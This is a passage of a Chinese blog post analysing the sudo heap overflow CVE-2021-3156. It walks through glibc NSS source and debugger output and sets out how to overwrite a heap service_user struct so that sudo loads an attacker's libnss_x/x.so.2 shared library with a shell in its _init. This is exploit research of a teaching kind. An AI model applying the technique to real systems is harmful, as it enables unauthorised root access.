<p>但是当我们以<code>sudoedit</code>执行的时候</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, <span class="string">&quot;edit&quot;</span>) == 0) &#123;</span><br><span class="line">  progname = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">  mode = MODE_EDIT;</span><br><span class="line">  sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里只会设置<code>mode = MODE_EDIT</code>，而并不会设置<code>valid_flags</code>，也就不会检测退出，我们就可以正常执行到堆溢出的部分。</p>
<p>这个漏洞是非常友好的，因为我们可以通过控制命令行参数从而控制<code>user_args</code>堆块申请的大小，溢出的内容以及溢出的长度。并且攻击者可以通过以反斜杠结尾的方式实现向目标地址写<code>0</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>这在进行分析之前我们首先需要了解一下<code>locale</code>和<code>nss</code>相关的信息。</p>
<p><code>locale</code>是根据计算机用户所使用的语言，所在的国家和地区所定义的一个软件运行时的语言环境，通常通过环境变量进行设置，<code>locale</code>相关的环境变量生效的顺序如下</p>
<ol>
<li><code>LANGUAGE</code>指定个人对语言环境的主次偏好，如<code>zh_CN:en_US</code></li>
<li><code>LC_ALL</code>是一个可以被<code>setlocale</code>设置的宏，其值可以覆盖所有其他的<code>locale</code>设定</li>
<li><code>LC_XXX</code>详细设定<code>locale</code>的各个方面，可以覆盖<code>LANG</code>的值</li>
<li><code>LANG</code>指定默认使用的<code>locale</code></li>
</ol>
<p>当<code>LC_ALL/LANG</code>被设置为<code>C</code>的时候，<code>LANGUAGE</code>的值将会被忽略。其命名规则如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language[_territory[.codeset]][@modifier]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中<code>language</code>是<a target="_blank" rel="noopener external nofollow noreferrer" href="https://zh.wikipedia.org/wiki/ISO_639-1">ISO 639-1</a>标准中定义的双字母的语言代码，<code>territory</code>是<a target="_blank" rel="noopener external nofollow noreferrer" href="https://zh.wikipedia.org/wiki/ISO_3166-1">ISO 3166-1</a>标准中定义的双字母的国家和地区代码，<code>codeset</code>是字符集的名称 (如 UTF-8等)，而 <code>modifier</code> 则是某些<code>locale</code>变体的修正符。我们可以详细的设置共<code>12</code>个环境变量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _nl_category_names</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  str41 = <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">  str67 = <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">  str140 = <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">  str193 = <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">  str207 = <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">  str259 = <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">  str270 = <span class="string">&quot;LC_PAPER&quot;</span>,</span><br><span class="line">  str279 = <span class="string">&quot;LC_NAME&quot;</span>,</span><br><span class="line">  str292 = <span class="string">&quot;LC_ADDRESS&quot;</span>,</span><br><span class="line">  str311 = <span class="string">&quot;LC_TELEPHONE&quot;</span>,</span><br><span class="line">  str322 = <span class="string">&quot;LC_MEASUREMENT&quot;</span>,</span><br><span class="line">  str330 = <span class="string">&quot;LC_IDENTIFICATION&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>nss</code>全称为<code>Name Service Switch</code>，在<code>*nix</code>操作系统中，<code>nss</code>是<code>C</code>语言库的一部分，用来解析<code>name</code>，比如登陆用户的用户名以及<code>IP</code>地址到域名的解析。举个例子，当我们输入命令<code>ls -alg</code>即查看一个目录中的文件列表，对于每一个文件我们可以看到它所属的用户和用户组，但是实际上系统中只保存了用户和用户组的<code>id</code>，要想显示与之相关的字符这就需要<code>nss</code>进行解析。我们可以在配置文件<code>/etc/nsswitch.conf</code>中定义相关数据库的查找规范</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@2c3723801aeb:/home/normal/CVE-2021-3156_blasty<span class="comment"># cat /etc/nsswitch.conf</span></span><br><span class="line"><span class="comment"># /etc/nsswitch.conf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example configuration of GNU Name Service Switch functionality.</span></span><br><span class="line"><span class="comment"># If you have the `glibc-doc-reference&#x27; and `info&#x27; packages installed, try:</span></span><br><span class="line"><span class="comment"># `info libc &quot;Name Service Switch&quot;&#x27; for information about this file.</span></span><br><span class="line"></span><br><span class="line">passwd:         files systemd</span><br><span class="line">group:          files systemd</span><br><span class="line">shadow:         files</span><br><span class="line">gshadow:        files</span><br><span class="line"></span><br><span class="line">hosts:          files dns</span><br><span class="line">networks:       files</span><br><span class="line"></span><br><span class="line">protocols:      db files</span><br><span class="line">services:       db files</span><br><span class="line">ethers:         db files</span><br><span class="line">rpc:            db files</span><br><span class="line"></span><br><span class="line">netgroup:       nis</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于每个可用的查找规范即<code>service</code>都必须有文件<code>libnss_service.so.2</code>与之对应，例如<code>group</code>数据库定义了查找规范<code>files</code>，那么在调用<code>getgroup</code>函数的时候就会调用<code>libnss_files.so.2</code>中的<code>nss_lookup_function</code>函数进行查找。因此我们可以在<code>ubuntu</code>中找到下面的共享库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">libnss_compat-2.31.so</span><br><span class="line">libnss_compat.so</span><br><span class="line">libnss_compat.so.2</span><br><span class="line">libnss_dns-2.31.so</span><br><span class="line">libnss_dns.so</span><br><span class="line">libnss_dns.so.2</span><br><span class="line">libnss_files-2.31.so</span><br><span class="line">libnss_files.so</span><br><span class="line">libnss_files.so.2</span><br><span class="line">libnss_hesiod-2.31.so</span><br><span class="line">libnss_hesiod.so</span><br><span class="line">libnss_hesiod.so.2</span><br><span class="line">libnss_nis-2.31.so</span><br><span class="line">libnss_nis.so</span><br><span class="line">libnss_nis.so.2</span><br><span class="line">libnss_nisplus-2.31.so</span><br><span class="line">libnss_nisplus.so</span><br><span class="line">libnss_nisplus.so.2</span><br><span class="line">libnss_systemd.so.2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>正常情况下当<code>sudo</code>调用到<code>__nss_lookup_function</code>情况如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">In file: /root/glibc/sourceCode/glibc-2.31/nss/nsswitch.c</span><br><span class="line">   408 <span class="comment">#endif</span></span><br><span class="line">   409</span><br><span class="line">   410</span><br><span class="line">   411 void *</span><br><span class="line">   412 __nss_lookup_function (service_user *ni, const char *fct_name)</span><br><span class="line"> ► 413 &#123;</span><br><span class="line">   414   void **found, *result;</span><br><span class="line">   415</span><br><span class="line">   416   /* We now modify global data.  Protect it.  */</span><br><span class="line">   417   __libc_lock_lock (lock);</span><br><span class="line">   418</span><br><span class="line">───────────────────[ STACK]─────────</span><br><span class="line">00:0000│ rsp  0x7fffffffe358 —▸ 0x7ffff7e3713f (internal_getgrouplist+175) ◂— <span class="built_in">test</span>   rax, rax</span><br><span class="line">01:0008│      0x7fffffffe360 ◂— 0x25b000000ae</span><br><span class="line">02:0010│      0x7fffffffe368 ◂— 0xffffff0000007d /* <span class="string">&#x27;&#125;&#x27;</span> */</span><br><span class="line">03:0018│      0x7fffffffe370 ◂— 0xffffffffffffffff</span><br><span class="line">04:0020│      0x7fffffffe378 —▸ 0x7fffffffe380 ◂— 0x1</span><br><span class="line">05:0028│      0x7fffffffe380 ◂— 0x1</span><br><span class="line">06:0030│      0x7fffffffe388 ◂— 0xc4e5bb2d41c2d00</span><br><span class="line">07:0038│      0x7fffffffe390 ◂— 0x0</span><br><span class="line">───────────────────[ BACKTRACE ]─────────────────</span><br><span class="line"> ► f 0     7ffff7e9bdf0 __nss_lookup_function</span><br><span class="line">   f 1     7ffff7e3713f internal_getgrouplist+175</span><br><span class="line">   f 2     7ffff7e373ed getgrouplist+109</span><br><span class="line">   f 3     7ffff7f4fe16 sudo_getgrouplist2_v1+198</span><br><span class="line">   f 4     7ffff7c53d63 sudo_make_gidlist_item+451</span><br><span class="line">   f 5     7ffff7c52b0e sudo_get_gidlist+286</span><br><span class="line">   f 6     7ffff7c4c86d runas_getgroups+93</span><br><span class="line">   f 7     7ffff7c39d32 set_perms+1650</span><br><span class="line">───────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p *ni</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  next = 0x55555557fc10,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN&#125;,</span><br><span class="line">  library = 0x0,</span><br><span class="line">  known = 0x0,</span><br><span class="line">  name = 0x55555557fc00 <span class="string">&quot;files&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(ni-&gt;next)</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  next = 0x0,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN&#125;,</span><br><span class="line">  library = 0x0,</span><br><span class="line">  known = 0x0,</span><br><span class="line">  name = 0x55555557fc40 <span class="string">&quot;systemd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当调用<code>getgroup</code>函数的时候，<code>__nss_lookup_function</code>会依次加载<code>files,systemd</code>这两个<code>service name</code>。而这两个<code>service name</code>的信息是存储在堆空间中的。看一下<code>__nss_lookup_function</code>函数的具体实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__nss_lookup_function (service_user *ni, <span class="type">const</span> <span class="type">char</span> *fct_name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> **found, *result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We now modify global data.  Protect it.  */</span></span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the tree of functions previously requested.  Data in the</span></span><br><span class="line"><span class="comment">     tree are `known_function&#x27; structures, whose first member is a</span></span><br><span class="line"><span class="comment">     `const char *&#x27;, the lookup key.  The search returns a pointer to</span></span><br><span class="line"><span class="comment">     the tree node structure; the first member of the is a pointer to</span></span><br><span class="line"><span class="comment">     our structure (i.e. what will be a `known_function&#x27;); since the</span></span><br><span class="line"><span class="comment">     first member of that is the lookup key string, &amp;FCT_NAME is close</span></span><br><span class="line"><span class="comment">     enough to a pointer to our structure to use as a lookup key that</span></span><br><span class="line"><span class="comment">     will be passed to `known_compare&#x27; (above).  */</span></span><br><span class="line"></span><br><span class="line">  found = __tsearch (&amp;fct_name, &amp;ni-&gt;known, &amp;known_compare);</span><br><span class="line">  <span class="keyword">if</span> (found == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* This means out-of-memory.  */</span></span><br><span class="line">    result = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*found != &amp;fct_name)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This name was not known before.  Now we have a node in the tree</span></span><br><span class="line"><span class="comment">	 (in the proper sorted position for FCT_NAME) that points to</span></span><br><span class="line"><span class="comment">	 &amp;FCT_NAME instead of any real `known_function&#x27; structure.</span></span><br><span class="line"><span class="comment">	 Allocate a new structure and fill it in.  */</span></span><br><span class="line"></span><br><span class="line">      known_function *known = <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> *known);</span><br><span class="line">      <span class="keyword">if</span> (! known)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Point the tree node at this new structure.  */</span></span><br><span class="line">	  *found = known;</span><br><span class="line">	  known-&gt;fct_name = fct_name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">	  <span class="comment">/* Load the appropriate library.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (nss_load_library (ni) != <span class="number">0</span>)</span><br><span class="line">	    <span class="comment">/* This only happens when out of memory.  */</span></span><br><span class="line">	    <span class="keyword">goto</span> remove_from_tree;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__nss_lookup_function)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在调用<code>nss_lookup_function</code>的时候一般<code>fct_name</code>是固定的字符串，所以这里我们直接进入<code>nss_load_library</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">nss_load_library</span> <span class="params">(service_user *ni)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">	 library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">	 is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">	 holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">	 default configuration.  */</span></span><br><span class="line">      <span class="type">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line">				     ni-&gt;name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="type">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">		      + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="type">int</span> saved_errno = errno;</span><br><span class="line">      <span class="type">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line">					      <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line">				    ni-&gt;name),</span><br><span class="line">			  <span class="string">&quot;.so&quot;</span>),</span><br><span class="line">		__nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> USE_NSCD</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (is_nscd)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> service_library *</span><br><span class="line"><span class="title function_">nss_new_service</span> <span class="params">(name_database *database, <span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  service_library **currentp = &amp;database-&gt;library;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*currentp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span> ((*currentp)-&gt;name, name) == <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span> *currentp;</span><br><span class="line">      currentp = &amp;(*currentp)-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have to add the new service.  */</span></span><br><span class="line">  *currentp = (service_library *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (service_library));</span><br><span class="line">  <span class="keyword">if</span> (*currentp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  (*currentp)-&gt;name = name;</span><br><span class="line">  (*currentp)-&gt;lib_handle = <span class="literal">NULL</span>;</span><br><span class="line">  (*currentp)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> *currentp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从代码中我们可以看出，如果<code>ni-&gt;library=NULL</code>，那么就会调用<code>nss_new_service</code>函数为其分配一个堆块，并对<code>name,lib_handle,next</code>赋值，完成之后进入<code>if (ni-&gt;library-&gt;lib_handle == NULL)</code>分支，对<code>name</code>进行字符串拼接，也就是<code>libnss_+name+&#39;.so.2&#39;</code>，之后就会调用<code>__libc_dlopen</code>函数加载动态链接库。</p>
<p>由于<code>ni</code>的<code>service name</code>结构体是分配在堆空间中的，而现在我们有存在<code>user_args</code>的堆溢出的漏洞，那么如果我们利用堆溢出将<code>service name</code>结构体的除<code>name</code>之外的其他成员变量全部覆写为<code>0</code>，<code>name</code>覆写为<code>x/x</code>那么经过字符串拼接之后就会加载<code>libnss_x/x.so.2</code>的动态链接库，我们将<code>getshell</code>的代码写入<code>_init</code>之后编译为动态链接库即可。</p>
<p>接下来就是如何溢出的问题。为了防止溢出过程中覆写中间的关键结构体，<code>user_args</code>与<code>service name</code>之间的距离要尽可能的小，最好的方法就是在<code>service name</code>上方人为的释放一个堆块，之后<code>user_args</code>再申请该堆块进行溢出。目前分析的<code>exp</code>是通过<code>setlocale</code>实现的。我们首先来看一下<code>service_user</code>的初始化过程</p>
<p>在<code>sudo.c:191</code>会调用<code>get_user_info</code>函数在获取用户信息的时候需要获取用户的用户名和口令信息，这就需要到了<code>nss</code>服务，也就是需要调用<code>passwd</code>对应的服务规范。在函数中会调用根据配置文件初始化<code>file/systemd</code>等服务规范，调用栈如下</p>
<img src="/[https:/image.lyyl.online/images/2021/02/07/image-20210204170734674.png](https:/image.lyyl.online/images/2021/02/07/image-20210204170734674.png)" alt="图片无法显示，请联系作者" title=" ">

<p>其中关键的逻辑代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__nss_database_lookup2 (<span class="type">const</span> <span class="type">char</span> *database, <span class="type">const</span> <span class="type">char</span> *alternate_name,</span><br><span class="line">			<span class="type">const</span> <span class="type">char</span> *defconfig, service_user **ni)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> (service_table == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* Read config file.  */</span></span><br><span class="line">    service_table = nss_parse_file (_PATH_NSSWITCH_CONF);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> name_database *</span><br><span class="line"><span class="title function_">nss_parse_file</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *fname)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  fp = fopen (fname, <span class="string">&quot;rce&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  result = (name_database *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (name_database));</span><br><span class="line">  <span class="keyword">if</span> (result == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fclose (fp);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result-&gt;entry = <span class="literal">NULL</span>;</span><br><span class="line">  result-&gt;library = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    name_database_entry *this;</span><br><span class="line">    <span class="type">ssize_t</span> n;</span><br><span class="line"></span><br><span class="line">    n = __getline (&amp;line, &amp;len, fp);</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (line[n - <span class="number">1</span>] == <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">      line[n - <span class="number">1</span>] = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Because the file format does not know any form of quoting we</span></span><br><span class="line"><span class="comment">	 can search forward for the next &#x27;#&#x27; character and if found</span></span><br><span class="line"><span class="comment">	 make it terminating the line.  */</span></span><br><span class="line">    *__strchrnul (line, <span class="string">&#x27;#&#x27;</span>) = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the line is blank it is ignored.  */</span></span><br><span class="line">    <span 